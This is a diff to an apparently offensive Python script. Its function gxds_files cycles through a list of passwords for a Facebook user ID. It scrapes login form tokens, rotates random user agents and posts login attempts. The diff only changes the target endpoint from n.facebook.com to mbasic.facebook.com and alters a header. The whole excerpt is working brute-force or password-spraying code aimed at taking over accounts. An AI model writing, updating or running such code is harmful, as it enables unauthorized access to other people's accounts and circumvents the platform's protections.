@@ -1056,7 +1056,7 @@ def gxds_files(uid, pxss):
     try:
         for ps in pxss:
             qwerty = random.choice(gxdsUArndm)
-            gxdsfbs = session.get("https://n.facebook.com").text
+            gxdsfbs = session.get("https://mbasic.facebook.com/").text
             dxta = {
                 "lsd": re.search('name="lsd" value="(.*?)"', str(gxdsfbs)).group(1),
                 "jazoest": re.search(
@@ -1071,8 +1071,8 @@ def gxds_files(uid, pxss):
                 "login": "Log In",
             }
             headxr = {
-                "authority": "https://n.facebook.com",
-                "method": "POST",
+                "authority": "https://mbasic.facebook.com",
+                "method": "GET",
                 "scheme": "https",
                 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
     'accept-language': 'en-US,en;q=0.9',
@@ -1093,7 +1093,7 @@ def gxds_files(uid, pxss):
                 'viewport-width': '980',
             }
             session.post(
-                url="https://n.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8",
+                url="https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8",
                 data=dxta,
                 headers=headxr,
             ).text
